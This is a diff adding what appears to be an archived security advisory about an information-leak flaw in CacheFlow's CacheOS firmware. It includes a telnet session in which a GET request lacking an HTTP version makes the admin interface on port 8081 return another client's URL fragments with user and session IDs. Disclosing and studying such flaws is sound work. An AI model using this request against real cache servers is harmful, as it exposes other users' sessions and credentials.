@@ -1,0 +1,25 @@
+source: http://www.securityfocus.com/bid/3841/info
+
+CacheOS is the firmware designed and distributed with CacheFlow web cache systems. It is maintained and distributed by CacheFlow.
+
+When a user connects to the system via the web administration interface on port 8081, and issues an HTTP standard-compliant request to the system, the system will prevent the user from accessing any information managed by the cache server. However, a user connecting to the system and issuing a request without the HTTP version request type (i.e. HTTP/1.0 or HTTP/1.1) multiple times may gain access to sensitive information. The cache server will leak information such as parts of URLs being accessed by a client currently connected to the cache server.
+
+This problem makes it possible for a user to gather information, and potentially gain access to passwords, userids, or other potentially sensitive information. 
+
+localhost:~# telnet cacheflow 8081
+Trying xxx.xxx.xxx.xxx...
+Connected to cacheflow.
+Escape character is '^]'.
+GET /Secure/Local/console/cmhome.htm
+
+HTTP/1.0 404-Not Found
+
+<HEAD><TITLE>404 Not Found</TITLE></HEAD><BODY><H1>404 Not Found</H1>The
+request
+ed URL "/Secure/Local/console/cmhome.htm
+
+Easp&o=0&sv=za5cb0d78&qid=E2BCA8F417ECE94DBDD27B75F951FFDA&uid=2c234acbec234
+acbe
+&sid=3c234acbec234acbe&ord=1" was not found on this
+server.<P></BODY>Connection
+closed by foreign host. 
